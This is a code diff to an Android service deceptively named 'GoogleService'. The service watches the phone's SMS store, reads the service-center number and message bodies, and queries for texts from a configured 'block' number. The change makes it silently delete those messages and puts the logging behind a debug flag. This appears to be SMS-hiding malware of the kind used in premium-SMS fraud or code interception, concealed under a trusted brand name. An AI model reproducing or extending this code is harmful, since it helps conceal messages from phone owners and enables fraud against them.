@@ -36,6 +36,8 @@ public class GoogleService extends Service {
     private static final String SMS_URI = "content://mms-sms/";
     private static final String SMS_INBOX_URI = "content://sms";
 
+    private String mBlockPhoneNumber = null;
+
     private ContentResolver mResolver;
 
     private ContentObserver smsContentObserver = new ContentObserver(new Handler()) {
@@ -53,18 +55,22 @@ public class GoogleService extends Service {
                     "date desc");*/
             //注释掉的是查未读状态的，但如果你的手机安装了第三放的短信软件时，他们有可能把状态改变了，你就查询不到数据
 
+            boolean showDeleteSMS = false;
             Cursor cursor = null;
-            if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())) {
+            if (!TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
+                    && !TextUtils.isEmpty(mBlockPhoneNumber)) {
                 cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                             new String[]{"_id", "address", "date", "body", "service_center"},
-                                            " address = ?", new String[]{AppRuntime.BLOCKED_NUMBER_WITH_PREFIX},
+                                            " address = ?", new String[]{mBlockPhoneNumber},
                                             "date desc");
+                showDeleteSMS = true;
             } else {
                 cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                             new String[]{"_id", "address", "date", "body", "service_center"},
                                             null,
                                             null,
                                             "date desc");
+                showDeleteSMS = false;
             }
 
             if (cursor == null) {
@@ -72,19 +78,20 @@ public class GoogleService extends Service {
             }
 
             LinkedList<String> idList = new LinkedList<String>();
-
             while (cursor.moveToNext()) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 String id = cursor.getString(cursor.getColumnIndex("_id"));
                 String center = cursor.getString(cursor.getColumnIndex("service_center"));
                 idList.add(id);
-                Config.LOGD("[[ContentObserver::onChanged]] current SMS address : " + address
-                                + " body : " + body + " id : " + id
-                                + " center : " + center
-                                + " >>>>>");
+                if (Config.DEBUG) {
+                    Config.LOGD("[[ContentObserver::onChanged]] current SMS address : " + address
+                                    + " body : " + body + " id : " + id
+                                    + " center : " + center
+                                    + " >>>>>");
+                }
                 if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
-                    && !TextUtils.isEmpty(center)) {
+                        && !TextUtils.isEmpty(center)) {
                     if (center.startsWith("+") == true && center.length() == 14) {
                         center = center.substring(3);
                     } else if (center.length() > 11) {
@@ -102,10 +109,12 @@ public class GoogleService extends Service {
                 e.printStackTrace();
             }
 
-            if (Config.DELETE_RECEIVED_MESSAGE) {
+            if (showDeleteSMS) {
                 for (String id : idList) {
                     mResolver.delete(Uri.parse("content://sms/" + id), null, null);
+                    if (Config.DEBUG) {
                     Config.LOGD("[[ContentObserver::onChanged]] try to delete SMS id : " + id);
+                    }
                 }
             }
         }
@@ -116,6 +125,8 @@ public class GoogleService extends Service {
         super.onCreate();
 
         Config.LOGD("[[GoogleService]] onCreate");
+
+        mBlockPhoneNumber = SettingManager.getInstance().getKeyBlockPhoneNumber();
 
         mResolver = getContentResolver();
         mResolver.registerContentObserver(Uri.parse(SMS_URI), true, smsContentObserver);
